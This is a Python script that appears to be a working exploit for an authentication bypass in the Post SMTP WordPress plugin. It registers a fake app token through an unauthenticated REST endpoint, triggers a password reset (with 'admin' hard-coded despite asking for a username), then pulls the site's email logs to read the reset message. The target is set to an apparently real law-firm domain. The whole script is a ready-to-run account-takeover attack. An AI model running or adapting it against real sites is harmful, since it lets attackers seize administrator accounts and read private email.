import requests

url = "https://www.courtlaw.com/" # Change this

# set fcm token
print("Setting the FCM Token")

request_url = f"{url}/wp-json/post-smtp/v1/connect-app"
request_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Accept-Encoding": "gzip, deflate, br", "Connection": "close", "fcm-token": "HelloWordfence", "device": "FakeDevice", "Content-Type": "application/x-www-form-urlencoded"}
requests.post(request_url, headers=request_headers)

# password reset
user_login = input("Username for password reset: ")
print("Attempting password reset")

request_url = f"{url}/wp-login.php?action=lostpassword"
request_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": f"{url}", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": f"{url}/wp-login.php?action=lostpassword", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
request_data = {"user_login": "admin", "redirect_to": '', "wp-submit": "Get New Password"}
requests.post(request_url, headers=request_headers, data=request_data)

# get logs array
print("Getting all email logs")

request_url = f"{url}/wp-json/post-smtp/v1/get-logs"
request_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Accept-Encoding": "gzip, deflate, br", "Connection": "close", "fcm-token": "HelloWordfence", "device": "FakeDevice"}
r = requests.get(request_url, headers=request_headers)
r = r.json()
print("Email logs: ")
for log in r["data"]:
	print(f"Id: {log['id']}, Subject: {log['original_subject']}, Recipient: {log['to_header']}")


email_id = input("Select an email ID to view: ")  # Ask to select as there may be other emails on the same testing environment
# see email data

request_url = f"{url}/wp-admin/admin.php?access_token=HelloWordfence&type=log&log_id={email_id}"
request_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Accept-Encoding": "gzip, deflate, br", "Connection": "close", "fcm-token": "HelloWordfence", "device": "FakeDevice"}
r = requests.get(request_url, headers=request_headers)
print(r.text)